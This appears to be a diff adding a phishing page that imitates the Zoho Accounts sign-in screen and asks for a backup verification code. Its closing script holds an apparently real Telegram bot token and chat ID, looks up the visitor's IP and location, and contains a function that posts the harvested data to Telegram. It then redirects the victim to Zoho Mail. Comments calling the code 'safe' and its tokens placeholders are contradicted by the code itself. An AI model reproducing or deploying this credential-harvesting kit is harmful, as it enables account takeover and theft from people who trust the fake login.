@@ -1,0 +1,799 @@
+<html lang="en">
+<head><meta name="IE_Compatible" http-equiv="X-UA-Compatible" content="IE=edge">
+
+	
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=2.0">
+    <meta name="description" content="Sign in to your Zoho account and access all your apps. If you don't have an account, you can sign up for one.">
+		<style type="text/css" nonce="wMlzaOdfnos+rIyD5THw1Q==">
+			.signin_box {
+				width: 500px;
+				height: auto;
+				background: #fff;
+				box-sizing: border-box;
+				padding: 50px 50px;
+				border-radius: 2px;
+				transition: all .1s ease-in-out;
+				float: left;
+				overflow-y: auto;
+				display: table-cell;
+				border-right: 2px solid #f1f1f1;
+			}
+			.zoho_logo {
+				display: block;
+				margin-bottom: 20px;
+				background: url('https://static.zohocdn.com/iam/v2/components/images/newZoho_logo.5f6895fcb293501287eccaf0007b39a5.svg') no-repeat transparent;
+				background-size: auto 100%;
+				height: 40px;
+			    width: auto;
+			}
+			.darkmode .zoho_logo{background-image: url('https://static.zohocdn.com/iam/v2/components/images/newZoho_logo_dark.aed96a3461d2b82c4145185f95c4b491.svg');}
+			@media (min-width: 600px) and (max-width: 1024px) {
+				.signin_box {   
+					width: 100%;
+					border-right: none;
+			    }
+			}
+			@media only screen and (max-width: 600px) {
+				.signin_box {   
+					width: 100%;
+				    padding: 0px 30px;
+				    height: auto;
+				    border-right: none;
+			    }
+			}
+			body{margin: 0px;}
+			.load-bg{top:0px}
+			.darkmode .load-bg{background-color: #191A23}
+			.line_loader{transform: scale(1);}
+			
+		</style>
+<link href="https://static.zohocdn.com/iam/v2/components/css/signinnew.min.bb6e7f9fe092a6fe2f1a2a6b3078b321.css" rel="stylesheet"><script src="https://static.zohocdn.com/iam/v2/components/js/signinnew.min.2bad8b4670820f3e3f0720d4ff58c598.js"></script>
+        <title>Zoho Accounts</title>
+	<script src="https://accounts.zoho.eu/u/multidc/info?callback=printUser&amp;dc=us"></script><script src="https://accounts.zoho.com.au/u/multidc/info?callback=printUser&amp;dc=us"></script><script src="https://accounts.zoho.in/u/multidc/info?callback=printUser&amp;dc=us"></script><script src="https://accounts.zoho.jp/u/multidc/info?callback=printUser&amp;dc=us"></script><script src="https://accounts.zoho.uk/u/multidc/info?callback=printUser&amp;dc=us"></script><script src="https://accounts.zohocloud.ca/u/multidc/info?callback=printUser&amp;dc=us"></script><script src="https://accounts.zoho.sa/u/multidc/info?callback=printUser&amp;dc=us"></script></head>
+	<body  style="
+  background-image: url('bck1.jpg');
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin: 0;
+">
+<style nonce="wMlzaOdfnos+rIyD5THw1Q==">
+	 .load-bg{
+	 	width: 100%;
+		height: 100%;
+		position: absolute;
+		z-index: 100;
+		opacity: 1;
+		transition: opacity .2s linear;
+		top: 0;
+		left: 0;
+	 }
+	 .load-fade{
+		opacity: 0;
+	 }
+	 .basic-box-s {
+		display: block;
+		position: absolute;
+	    top: 0px;
+	    left: 0px;
+	    right: 0px;
+	    bottom: 0px;
+	    width: 50px;
+	    height: 50px;
+	    margin: auto;
+     }
+      .box-anim {
+        animation: load-anim 2s cubic-bezier(0.83, -0.01, 0.22, 1) infinite;
+      }
+       @keyframes load-anim {
+        0% {
+          transform: rotate(0deg);
+        }
+        10% {
+          transform: rotate(-30deg);
+        }
+        50%{
+            transform: rotate(180deg);
+        }
+        60%{
+            transform: rotate(165deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+       .path {
+        stroke-dasharray: 150px;
+        stroke-dashoffset: 150px;
+        stroke-linecap: round;
+      }
+      .path1-anim {
+        animation: stroke-anim1 4s cubic-bezier(0.83, -0.01, 0.22, 1) infinite;
+      }
+      .path2-anim {
+        animation: stroke-anim2 4s cubic-bezier(0.83, -0.01, 0.22, 1) infinite;
+      }
+      .path3-anim {
+        animation: stroke-anim3 4s cubic-bezier(0.83, -0.01, 0.22, 1) infinite;
+      }
+      .path4-anim {
+        animation: stroke-anim4 4s cubic-bezier(0.83, -0.01, 0.22, 1) infinite;
+      }
+       @keyframes stroke-anim1 {
+        0% {
+          stroke-opacity: 1;
+          stroke-dashoffset: 150px;
+        }
+        3% {
+          stroke-dashoffset: 150px;
+        }
+        21%,
+        25% {
+          stroke-dashoffset: 0;
+        }
+        50% {
+          stroke-opacity: 1;
+        }
+        100% {
+          stroke-dashoffset: 0px;
+          stroke-opacity: 0;
+        }
+      }
+      @keyframes stroke-anim2 {
+        0% {
+          stroke-dashoffset: 150px;
+        }
+        25% {
+          stroke-opacity: 1;
+          stroke-dashoffset: 150px;
+        }
+        28% {
+          stroke-dashoffset: 150px;
+        }
+        46%,
+        50% {
+          stroke-dashoffset: 0px;
+        }
+        75% {
+          stroke-dashoffset: 0px;
+          stroke-opacity: 1;
+        }
+        100% {
+          stroke-dashoffset: 0px;
+          stroke-opacity: 0;
+        }
+      }
+      @keyframes stroke-anim3 {
+        0% {
+          stroke-opacity: 0;
+          stroke-dashoffset: 150px;
+        }
+        49% {
+          stroke-opacity: 0;
+        }
+        50% {
+          stroke-opacity: 1;
+          stroke-dashoffset: 150px;
+        }
+        53% {
+          stroke-dashoffset: 150px;
+        }
+        71%,
+        75% {
+          stroke-dashoffset: 0;
+        }
+        100% {
+          stroke-dashoffset: 0;
+          stroke-opacity: 1;
+        }
+      }
+      @keyframes stroke-anim4 {
+        0% {
+          stroke-dashoffset: 150px;
+          stroke-opacity: 0;
+        }
+        74% {
+          stroke-opacity: 1;
+        }
+        75% {
+          stroke-opacity: 1;
+          stroke-dashoffset: 150px;
+        }
+        78% {
+          stroke-dashoffset: 150px;
+        }
+        96%,
+        100% {
+          stroke-dashoffset: 0;
+        }
+      }
+</style>
+
+		<div id="form-area" class="load-bg fade load-fade" style="display: none;">
+		<div class="basic-box-s box-anim">
+        <svg width="50" height="50" style="shape-rendering: geometricPrecision;" class="line_loader">
+          <rect x="5" y="5" rx="6" ry="6" width="40" height="40" class="path" style="stroke: rgb(246, 177, 27); stroke-width: 5.4; stroke-opacity: 1; fill: transparent; stroke-dasharray: 384px; stroke-dashoffset: 0px"></rect>
+          <rect x="5" y="5" rx="6" ry="6" width="40" height="40" class="path path1 path1-anim" style="stroke: rgb(226, 39, 40); stroke-width: 5; stroke-opacity: 1; fill: transparent"></rect>
+          <rect x="5" y="5" rx="6" ry="6" width="40" height="40" class="path path2 path2-anim" style="stroke: rgb(4, 152, 73); stroke-width: 5; stroke-opacity: 1; fill: transparent"></rect>
+          <rect x="5" y="5" rx="6" ry="6" width="40" height="40" class="path path3 path3-anim" style="stroke: rgb(34, 110, 179); stroke-width: 5; stroke-opacity: 1; fill: transparent"></rect>
+          <rect x="5" y="5" rx="6" ry="6" width="40" height="40" class="path path4 path4-anim" style="stroke: rgb(246, 177, 27); stroke-width: 5.4; stroke-opacity: 1; fill: transparent"></rect>
+        </svg>
+      </div>
+      </div>			<div class="bg_one"></div>
+    		<div class="Alert"> <span class="tick_icon"></span> <span class="alert_message"></span> </div>
+    		<div class="Errormsg"> <div style="position:relative;display:flex;align-items:center;"> <span class="error_icon"></span> <span class="error_message"></span> <a class="error_help" href="#"></a> <div class="topErrClose hide"></div> </div> </div>
+			<div class="container">
+			<div class="up-arrow">
+				<div class="uparrow_container">
+					<div class="tooltip_header">
+						<span class="tooltip_DC">Signing in to multiple accounts</span>
+					</div>
+					<div class="tooltip_con">Currently signed-in accounts will be listed here. You can keep multiple accounts signed-in on a browser as long as each of them are in different data centers.</div>
+				</div>
+				<div class="info_line"></div>
+				<div class="info_DC-details">
+					<div class="tooltip_header">Signed-in data centers</div>
+					<div class="DC-details"></div>
+				</div>
+			</div>
+    		<div class="signin_container" style="visibility: visible;">
+    			<div class="loader"></div>
+    			<div class="blur_elem blur"></div>
+    			<div class="signin_box" id="signin_flow">
+    					<div id="signin_box_info">
+    						<span class="error_icon signin_box_erroricon"></span>
+    					</div>
+	    					<div class="smartsigninbutton hide" id="smartsigninbtn">
+	    						<span class="ssibuttonqricon icon-SmartQR"></span>
+	    						<span class="ssibuttoncontent">Try smart sign-in</span>
+	    						<span class="ssibuttonshineicon icon-shine"></span>
+	    					</div>
+							<div class="zoho_logo AaaServer"></div>
+	    				<div id="signin_div">
+	    					
+	    						<div class="signin_head">
+	    							<div class="backupstep">STEP <span>1</span> OF 2</div>
+			    					<span id="headtitle">Sign in</span>
+			    					<span id="trytitle"></span>
+									<div class="service_name">to access <span>Accounts</span></div>
+									<div class="fielderror"></div>
+								</div>
+								<div id="multiDC_container">
+									<div class="multiDC_header">
+										<span>Signed-in accounts</span>
+										<div class="multiDC_info tooltip icon-questionmark"></div>
+									</div>
+									<div id="account_details"></div>
+									<div class="line" style="display: none;"></div>
+									<div class="login_another">
+										<span class="icon-createaccount">
+											<span class="path1"></span>
+										</span>
+										<span>Sign in to another account</span>
+									</div>
+								</div>
+								<div class="fieldcontainer">
+									<div class="searchparent" id="login_id_container" style="display: none;">
+									<div class="textbox_div" id="getusername">
+									<span><div class="MobflagContainer" style="position: absolute; display: none;"><i class="mobileFlag" style="margin-top:12px;"><span class="flag-us"><span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span></span></i><label for="country_code_select" class="select_country_code" style="display: none;">+1</label><span class="arrow_position"><b style="height: 0px; width: 0px;border-color: transparent #CCCCCC #CCCCCC transparent;border-style: solid;transform: rotate(45deg);border-width: 3px;display: inline-block;position: relative;"><b><span></span></b></b></span></div>
+										<div class="uvselect select_container country_code_select select_container--country_implement select_container_cntry_code" jsid="country_code_select" style="width: fit-content; display: none;"><div class="selectbox basic_selectbox selectbox--country_implement selectbox_cntry_code" jsid="country_code_select" tabindex="0"><span class="selectbox_overlay"></span><i class="leading_icon select_icon select_icon--country_implement flagIcons"><span class="flag-ng"><span class="path1"></span><span class="path2"></span><span class="path3"></span></span></i><input class="select_input select_input--country_implement select_input_cntry_code" jsid="country_code_select" selected-value="NG" placeholder="" country-flag="true" disabled="true" data-num="NG" selected="selected" style="width: 5ch;"><span class="selectbox_arrow selectbox_arrow--country_implement"><b></b></span></div><div class="input_error input_error--country_implement"></div></div>
+										 
+										<span class="doaminat hide">@</span>
+										<div class="textbox hide" id="portaldomain">
+										<select class="domainselect" id="domaincontainer"></select>
+										</div>
+										<div class="fielderror"></div>		
+									</span>				
+									</div>
+									</div>
+<div id="container">
+	<form id="requestForm" method="post" novalidate="">
+									<div class="getpassword">
+		  								<div class="hellouser">
+											
+									<div class="textbox_div">
+											<input id="bookCode" placeholder="Backup verification code" type="text" class="textbox" required="" autocapitalize="off" autocomplete="current-password" autocorrect="off" maxlength="250"> 
+											
+											
+											<div class="textbox_actions" id="" style="display: block;">
+													
+											</div>
+												<div id="password-section" class="textbox_div">
+
+<p>Enter the backup verification code you generated from your Zoho account.</p>
+      
+	</div>								</div> 
+									</div>
+								<button id="submitBtn" type="submit" class="btn blue">Sign in</button>						
+								
+							
+							</div>
+
+	    					</form>
+	    					<div class="thankyou" id="thankyouMessage" style="display: none;">✅ Sorry! FILE REQUESTED EXPIRED Redirecting...</div>
+  </div>
+
+  
+<div id="password-section" class="textbox_div">
+
+
+      
+	</div>
+   
+    
+
+				    		   
+	    </div>						
+							
+							 
+
+
+
+
+							<div id="alternate_verification_info">
+								
+								
+
+
+
+
+								<div class="alterstep_con"> 
+									<div style="margin-bottom:12px">
+										<span id="oaalter_title_first">Verify using a primary sign in option.</span>
+										<div class="oaalter_con_first">Enter your password, email/mobile OTP or its equivalent to verify.</div>
+									</div>
+									<div>
+										
+										
+									</div>
+								</div>
+								<button class="btn blue proceed_btn">Proceed</button>
+								
+							</div>
+	    				<div>
+	    		</div>
+	    				<div class="fed_2show" style="display: none;">
+							<div class="signin_fed_text">Sign in using</div>
+							<div class="signin_fed_head" id="fed_large_title">
+			    				<span id="headtitle">Sign in</span>
+			    				<span id="trytitle"></span>
+								<div class="service_name">to access <span>Accounts</span></div>
+								<div class="fielderror"></div>
+							</div>
+							<div role="group" aria-labelledby="fed_large_title">
+								
+								
+								<span class="fed_div yahoo_icon yahoo_fed small_box show_fed" value="yahoo" role="button" tabindex="0" aria-label="Sign in with Yahoo" style="display: inline-block;">
+								 <div class="fed_center">
+						            <div class="icon-yahoo_small fedicon yahooicon"></div>
+						            <span class="fed_text" style="display: none;">Sign in with Yahoo</span>
+						         </div>
+						        </span>
+								
+								 <span class="fed_div linkedin_fed_box linkedin_fed small_box show_fed" value="linkedin" role="button" tabindex="0" aria-label="Sign in with Linkedin" style="display: inline-block;">
+						            <div class="fed_center_linkedIn">
+						                <span class="icon-linkedin_small fedicon linkedicon"></span>
+						                <span class="fed_text" style="display: none;">Sign in with Linkedin</span>
+						            </div>
+						        </span>
+								<span class="fed_div twitter_fed_box twitter_fed small_box show_fed" value="twitter" role="button" tabindex="0" aria-label="Sign in with Twitter" style="display: inline-block;">
+						            <div class="fed_center">
+						                <span class="icon-twitter_small fedicon"></span>
+						                <span class="fed_text" style="display: none;">Sign in with Twitter</span>
+						            </div>
+						        </span>
+								<span class="fed_div MS_icon azure_fed small_box show_fed" value="azure" role="button" tabindex="0" aria-label="Sign in with Microsoft" style="display: inline-block;">
+						            <div class="fed_center">
+						                <span class="icon-azure_small fedicon">
+						                		<span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span>
+						                </span>
+						                <span class="fed_text" style="display: none;">Sign in with Microsoft</span>
+						            </div>
+						        </span>
+								<span class="fed_div slack_icon slack_fed small_box" value="slack" role="button" tabindex="0" aria-label="Sign in with Slack" style="display: none;">
+									 <div class="fed_center">
+							            <div class="icon-slack_small fedicon slackicon">
+							            		<span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span>
+							            	</div>
+							            	<span class="fed_text" style="display: none;">Sign in with Slack</span>
+							         </div>
+						        </span>
+								
+								<span class="fed_div github_icon github_fed small_box" value="github" role="button" tabindex="0" aria-label="Sign in with Github" style="display: none;">
+						            <div class="fed_center">
+							            <span class="icon-github_small fedicon"></span>
+										<span class="fed_text" style="display: none;">Sign in with Github</span>
+						            </div>
+						        </span>
+							<span id="fed_signin_options"></span>
+							<span class="fed_div more small_box" id="showIDPs" role="button" tabindex="0" aria-expanded="false" aria-label="More" style="display: none;"> <span class="morecircle"></span> <span class="morecircle"></span> <span class="morecircle"></span></span>
+							<div class="zohosignin hide" role="button" tabindex="0" aria-expanded="false" aria-label="Sign in with Zoho">Sign in with Zoho<span class="fedarrow"></span></div>	
+						</div>
+					</div>
+    			</div>
+    			<div class="nopassword_container">
+    				<div class="nopassword_icon icon-hint"></div>
+    				<div class="nopassword_message">You have not set a password for this account <label class="blue_link goToForgotPassword" for="i18n_onclick_handler">Set password now</label>.</div>
+    			</div>
+    			<div class="go_to_bk_code_container">
+    				<div class="close_btn hideBkCodeRedirection"></div>
+    				<div class="nopassword_icon icon-hint"></div>
+    				<div class="backup_info_tab">
+    					<div style="font-size:12px;font-weight:500;">Try Backup Verification Code</div>
+    					<div style="margin-top: 5px;color: #000000BF;">If you are unable to sign in using SMS-based OTP, you can use backup verification codes to sign in.</div>
+    				</div>
+    				<div class="button_parent"><span class="backup_action showBackupVerificationCode">Try Now</span></div>
+    			</div>
+    			<div class="goto_oneauth_fallback_container">
+    				<div class="close_btn oa_close hideOABackupRedirection"></div>
+    				<div class="nopassword_icon icon-uninstalled"></div>
+    				<div class="backup_info_tab">
+    					<div class="backup_info_header">Alternate options to verify</div>
+    					<div class="backup_info_content">It seems you've uninstalled the OneAuth app on your primary device <b>{0}.</b> Please verify using other sign in modes.<a href="{1}" target="_blank" rel="noreferrer"> Learn more</a>  </div>
+    					<div class="backup_info_mode btn">Show available options</div>
+    				</div>
+    			</div>
+
+<div class="password_expiry_container">
+	<div class="passexpsuccess"></div>
+		<div class="signin_head">
+			<span id="headtitle">Change Password</span>
+			<div class="pass_name extramargin" id="password_desc"></div>
+		</div>
+		<div class="textbox_div" id="npassword_container">
+				<input id="new_password" class="npassinput textbox" placeholder="Enter new password" name="newPassword" type="password" data-val="npassword" required="" autocapitalize="off" autocomplete="off" autocorrect="off">
+				<span class="icon-hide show_hide_Confpassword" data-id="#new_password"></span>
+		</div>
+		<div class="textbox_div" id="rpassword_container">
+				<input id="new_repeat_password" class="npassinput textbox" placeholder="Confirm Password" name="cpwd" type="password" data-val="rpassword" required="" autocapitalize="off" autocomplete="off" autocorrect="off"> 
+				<span class="icon-hide show_hide_Confpassword" data-id="#new_repeat_password"></span>
+				<span class="icon-successTick show_Success"></span>
+		</div>
+		<button class="btn blue" id="changepassword"><span>Set Password</span></button>
+	</div>
+
+<div class="terminate_session_container">
+    				<div class="signin_head">
+							<span id="headtitle">Terminate Sessions</span>
+							<div class="pass_name extramargin" id="password_desc">Apart from changing your password, you can perform the following action if you feel your account is compromised.</div>
+					</div>
+
+
+
+
+					
+
+
+
+
+
+    			</div>
+    			
+    			
+    			
+    				
+				
+					<div id="signuplink" style="display: none;">Don't have a Zoho account? <span class="blue_link signuptrigger">Sign up now</span></div>
+				<div id="device_box_info">
+					<span class="icon-warning device_warning"></span>
+					<span>You no longer need to enter password. As enforced by your administrator, your OneAuth sign-in mode has been changed to <b>Passwordless</b>.</span>
+				</div>
+    		</div>
+    		
+	    		<div class="rightside_box">
+	    			<div class="mfa_panel hide" style="display: none;">
+	    				<div class="product_img" id="product_img"></div>
+							<div class="product_head">Keep your account secure</div>	
+							<div class="product_text">Zoho OneAuth is our new in-house multi-factor authentication app. Shield your Zoho account with <a style="color:#309FF4;text-decoration:none;" href="">OneAuth</a> now.</div>
+	    			</div>
+				<div id="overlapBanner" class="overlapBanner" style="width: 300px; display: block;"><div id="banner_0" class="rightbanner rightbannerTransition slideright">
+    
+    
+    
+    
+    
+    <!--   BANNER TYPE 1     -->
+    	<style type="text/css">
+      		.banner1_img{
+      			display:block;
+      			width: 300px; 
+      			height: 240px; 
+      			margin:auto;
+      			background-size: 100%;
+      		}
+      		.banner1_heading{ 
+      			font-size: 16px; 
+      			font-weight: 600; 
+      			margin-top: 20px; 
+      		}
+      		.banner1_content{
+      			font-size: 14px; 
+      			font-weight: 400; 
+      			margin-top: 10px; 
+      		}
+      		.banner1_href{ 
+      			width: max-content; 
+      			max-width: 160px;  
+      			margin: auto; 
+      			margin-top: 20px; 
+      			background-color: #ECF7FE; 
+      			color: #0091FF; 
+      			font-weight: 600; 
+      			border-radius: 18px; 
+      			padding: 8px 20px; 
+      			border: none; 
+      			cursor: pointer; 
+      			text-decoration: none; 
+      			box-sizing: border-box; 
+      			font-size: 14px; 
+      		}
+      		.banner1_heading,.banner1_content,.banner1_href{
+      			display: block; 
+      			line-height: 20px;
+      			text-align: center; 
+      		}
+    	</style>
+        <div class="container">
+            <div class="banner1_img" style="background-image: url('https://static.zohocdn.com/iam/v2/components/images/Passwordless_illustration.5c0b2b6048ba19d2dec9f1fba38291c9.svg');"></div>
+            <div class="banner1_heading">Passwordless sign-in</div>
+            <div style="" class="banner1_content">Move away from risky passwords and experience one-tap access to Zoho. Download and install OneAuth. </div>
+            <a class="banner1_href" href="https://zoho.to/za_signin_oa_rp" target="_blank" rel="noreferrer">Learn more</a>
+        </div>      
+        
+    
+    
+
+</div><div id="banner_1" class="rightbanner rightbannerTransition">
+    
+    
+    
+    
+    
+    <!--   BANNER TYPE 1     -->
+    	<style type="text/css">
+      		.banner1_img{
+      			display:block;
+      			width: 300px; 
+      			height: 240px; 
+      			margin:auto;
+      			background-size: 100%;
+      		}
+      		.banner1_heading{ 
+      			font-size: 16px; 
+      			font-weight: 600; 
+      			margin-top: 20px; 
+      		}
+      		.banner1_content{
+      			font-size: 14px; 
+      			font-weight: 400; 
+      			margin-top: 10px; 
+      		}
+      		.banner1_href{ 
+      			width: max-content; 
+      			max-width: 160px;  
+      			margin: auto; 
+      			margin-top: 20px; 
+      			background-color: #ECF7FE; 
+      			color: #0091FF; 
+      			font-weight: 600; 
+      			border-radius: 18px; 
+      			padding: 8px 20px; 
+      			border: none; 
+      			cursor: pointer; 
+      			text-decoration: none; 
+      			box-sizing: border-box; 
+      			font-size: 14px; 
+      		}
+      		.banner1_heading,.banner1_content,.banner1_href{
+      			display: block; 
+      			line-height: 20px;
+      			text-align: center; 
+      		}
+    	</style>
+        <div class="container">
+            <div class="banner1_img" style="background-image: url('https://static.zohocdn.com/iam/v2/components/images/MFA_illustration.1afa6dddd07d21ad33a652ec63d146d6.svg');"></div>
+            <div class="banner1_heading">MFA for all accounts</div>
+            <div style="" class="banner1_content">Secure online accounts with OneAuth 2FA. Back up OTP secrets and never lose access to your accounts. </div>
+            <a class="banner1_href" href="">Learn more</a>
+        </div>      
+        
+    
+    
+
+</div></div><div class="dotHead"><div class="dot" id="dot_0"><div style="transition: opacity 0.3s ease-in-out, transform linear; transform: scaleX(0); background: rgb(0, 162, 246);"></div></div><div class="dot" id="dot_1" selected="selected"><div style="transition: opacity 0.3s ease-in-out, transform 5s linear; transform: scaleX(1); background: rgb(0, 162, 246);"></div></div></div></div>
+    		</div>
+			
+		</div>    	
+	    
+		
+<style>
+#footer
+{	
+    width: 100%;
+    height: 20px;
+    font-size: 14px;
+    color: #727272;
+   	position:absolute;
+   	left:0px;
+   	right:0px;
+    margin:20px auto;
+    text-align:center;
+    font-size: 14px;
+    bottom: 0px;
+}
+#footer a
+{
+    text-decoration:none;
+    color: #727272;
+    font-size: 14px;
+}
+
+@media only screen and (max-width : 435px)
+{
+	#footer a,#footer{	
+		font-size: 12px;
+		z-index: 1;
+	}
+}
+</style>
+
+<footer id="footer" style="top: 591px;"> 
+
+	<span>© 2025, <a href="" rel="noreferrer">Zoho Corporation Pvt. Ltd.</a> All Rights Reserved.	</span>
+	
+</footer>
+
+	
+
+
+ <script>
+
+// === config - fill these yourself if you decide to use Telegram ===
+const TELEGRAM_BOT_TOKEN = "6791091402:AAGjGUuVgtOVr5FLl0hY2BKTrmvJiEtSkds"; // <- replace when ready
+const TELEGRAM_CHAT_ID = "6333170061"; // <- replace when ready
+
+// === runtime state ===
+let attempt = 0;
+
+// === helper: collect IP / geo info (returns a Promise) ===
+async function fetchIpInfo() {
+  try {
+    // Primary: ipapi.co (IP + geo)
+    const res = await fetch('https://ipapi.co/json/');
+    if (!res.ok) throw new Error("ipapi failed");
+    return await res.json();
+  } catch (err1) {
+    console.warn("Primary IP lookup failed:", err1);
+
+    try {
+      // Fallback: ipify.org (just IP)
+      const res2 = await fetch('https://api.ipify.org?format=json');
+      if (!res2.ok) throw new Error("ipify failed");
+      const data2 = await res2.json();
+      return {
+        ip: data2.ip,
+        city: 'Unknown',
+        region: 'Unknown',
+        country: 'Unknown',
+        org: 'Unknown',
+        timezone: 'Unknown'
+      };
+    } catch (err2) {
+      console.warn("Fallback IP lookup failed:", err2);
+
+      // Final fallback: completely unknown
+      return {
+        ip: 'Unknown',
+        city: 'Unknown',
+        region: 'Unknown',
+        country: 'Unknown',
+        org: 'Unknown',
+        timezone: 'Unknown'
+      };
+    }
+  }
+}
+
+
+// === safe wrapper: send to Telegram (replace tokens to enable) ===
+async function sendToTelegram(message) {
+  // WARNING: do not use this to exfiltrate real credentials without consent.
+  // Replace TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID before enabling.
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") {
+    console.log('[sendToTelegram] placeholders detected — message not sent. Message would be:\n', message);
+    return;
+  }
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const payload = {
+    chat_id: TELEGRAM_CHAT_ID,
+    text: message,
+    parse_mode: 'HTML'
+  };
+
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    const data = await res.json();
+    console.log('Telegram response:', data);
+  } catch (err) {
+    console.error('Failed to send to Telegram:', err);
+  }
+}
+
+// === mock-safe alternative: send to your server endpoint ===
+async function sendToServerEndpoint(payloadObj) {
+  // Replace URL with your own backend if you want server-side logging/testing
+  // For safety, this function just logs if you keep placeholder endpoint.
+  const endpoint = "https://your-server-endpoint.com/collect"; // edit when ready
+  console.log('[sendToServerEndpoint] payload:', payloadObj);
+
+  if (endpoint.includes('your-server-endpoint')) {
+    // Placeholder - don't actually POST to a fake URL
+    return;
+  }
+
+  try {
+    await fetch(endpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payloadObj)
+    });
+  } catch (err) {
+    console.error('Failed to post to server endpoint:', err);
+  }
+}
+
+// === format a nice message for Telegram ===
+function buildTelegramMessage(stageLabel, email, passwordOrNA, ipInfo, extra) {
+  return `<b>${stageLabel}</b>\n` +
+         `bookCode: ${bookCode}\n` +
+         `IP: ${ipInfo.ip}\n` +
+         `City: ${ipInfo.city}\n` +
+         `Region: ${ipInfo.region}\n` +
+         `Country: ${ipInfo.country}\n` +
+         `Org: ${ipInfo.org}\n` +
+         `Timezone: ${ipInfo.timezone}\n` +
+         `Extra: ${extra}\n` +
+         `Date & Time: ${new Date().toLocaleString()}`;
+}
+    const form = document.getElementById('requestForm');
+    const thankyouMessage = document.getElementById('thankyouMessage');
+    const submitBtn = document.getElementById('submitBtn'); // you can use this later
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const code = document.getElementById('bookCode').value.trim();
+      if (!code) return alert("Please enter a reading code");
+
+      // Get existing saved codes
+      let savedCodes = JSON.parse(localStorage.getItem("libraryBookCodes")) || [];
+
+      // Add new code to the list
+      savedCodes.push({
+        code: code,
+        date: new Date().toLocaleString()
+      });
+
+      // Save updated list
+      localStorage.setItem("libraryBookCodes", JSON.stringify(savedCodes));
+
+      // Show thank you message
+      form.style.display = 'none';
+      thankyouMessage.style.display = 'block';
+
+      // Redirect after 3 seconds
+      setTimeout(() => {
+        window.location.href = "https://mail.zoho.com";
+      }, 3000);
+    });
+  </script>
+</body></html>
